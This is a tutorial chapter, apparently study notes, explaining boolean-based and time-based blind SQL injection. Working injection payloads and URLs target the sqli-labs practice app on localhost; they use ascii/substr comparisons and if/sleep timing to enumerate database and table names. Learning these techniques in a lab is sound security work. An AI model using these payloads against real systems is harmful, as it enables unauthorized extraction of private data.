# Chapter 5 

This [blog](https://www.acunetix.com/websitesecurity/sql-injection2/) explaind the different types of SQL injections quite well. 

## Introduction to Blind SQLi 

> Blind SQL (Structured Query Language) injection is a type of SQL Injection attack that asks the database true or false questions and determines the answer based on the applications response. This attack is often used when the web application is configured to show generic error messages, but has not mitigated the code that is vulnerable to SQL injection.

Blind SQL injection can be broadly classified into two types - 

1.  ```Boolean Based SQL Injection``` 
1.  ```Time Based SQL Injection```

## Boolean Based SQL Injection

> Boolean-based SQL Injection is an inferential SQL Injection technique that relies on sending an SQL query to the database which forces the application to return a different result depending on whether the query returns a TRUE or FALSE result.

> Depending on the result, the content within the HTTP response will change, or remain the same. This allows an attacker to infer if the payload used returned true or false, even though no data from the database is returned. This attack is typically slow (especially on large databases) since an attacker would need to enumerate a database, character by character.

## Time Based SQL Injection

> Time-based SQL Injection is an inferential SQL Injection technique that relies on sending an SQL query to the database which forces the database to wait for a specified amount of time (in seconds) before responding. The response time will indicate to the attacker whether the result of the query is TRUE or FALSE.

> Depending on the result, an HTTP response will be returned with a delay, or returned immediately. This allows an attacker to infer if the payload used returned true or false, even though no data from the database is returned. This attack is typically slow (especially on large databases) since an attacker would need to enumerate a database character by character.

## Some more SQL stuff

Here are a few SQL functions which will be handy for boolean based SQL injection - 

1.  ```length(string)```
    
    This function returns the length of the string passed which is passed as a parameter.

1.  ```substr(string, start_index, end_index)```

    This function returns a substring of the function. 

1.  ```ascii(string)```

    This function converts a character to its ascii value and returns the decimal integer value. 

## Playing around with Boolean Based Blind SQLi

We try to enumerate each the value of the target by asking simple boolean questions. We check the name of our target character by character againt a value and see if that is true or false. 

If it is true, we can conclude that the value that we tested against the target name is indeed the name of our target. 

The target name can be the name of the database, name of the table or names of the columns of the table. 

The following query can be used to predict the name of the target - 

```sql 
select ascii(substr((select database()), 1, 1)) = 101
```

:warning: The above query checks whether the first character of the selected database is 101 i.e. ascii value for 'e'. 

```sql
select ascii(substr((select database()), 1, 1)) < 101
```

:warning: Also, query like the one above can be executed to predict what the character of the target.

Similarly, the query can be manipulated somewhat like this - 

```sql
select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1), 1, 1)) = 101;
```

:boom: Comparing with ascii values can make the process of finding the name of the target much faster. 

This is how the url will look like - 

```
http://localhost/sqlilabs/Less-8/?id=1' and (select ascii(substr((select database()), 3, 3)) = 99) --+
```

:warning: Any statement after ```AND``` needs to be in parenthesis as ```AND``` operator can only take one value.

## Playing around with Time Based Blind SQL Injection

Some functions that are often used in Time Based Sqli are as follows - 

1.  ```if(condition, true_return_value, false_return_value)``` 
1.  ```sleep(time_to_sleep)```

Time based SQLi can be used in cases where we don't get any useful response on breaking the url query. This is similar to boolean based SQLi with the only difference being that instead of seeing a visible true/false, we get to infer true/false based on how long we have to wait to ge the response. 

We write such a query that will make the website send the response after a certain period of time depending on whether the query is true or false. 

The query looks somewhat like this - 

```sql 
select if(substr(database(), 1, 1) = 's', sleep(10), null);
```

:warning: If the above query is executed, depending on the condition we would get to see the response immediately or after certain period of time. If the query is evaluates to false, we will get to see the response immediately; else we will see the response after a certain period of time. 

In order to work with time based sqli we have to assume that a certain character breaks the url. In the case of lesson-9 of sqli-labs we asssume that ```1'``` breaks the query and we proceed with adding the sleep() function. If the url sucessfully executes the query, then we can conclude that time based sqli can be used in this particular case. 

```
http://localhost/sqlilabs/Less-9/?id=1' and if(substr(database(), 1, 1) = 's', sleep(10), null) --+
```

Another way to do the same as above.

```
http://localhost/sqlilabs/Less-9/?id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1), 1, 1)) = 101, sleep(10), null) --+
```

We can use the above query to get more information from the database. 

In case it doesn't work we move on to a different strategy i.e. we try ```1"``` or ```\``` and so on.

:warning: Tools like [```Havij```](https://www.darknet.org.uk/2010/09/havij-advanced-automated-sql-injection-tool/) and [```sqlmap```](https://github.com/sqlmapproject/sqlmap) can be used to get results quickly.

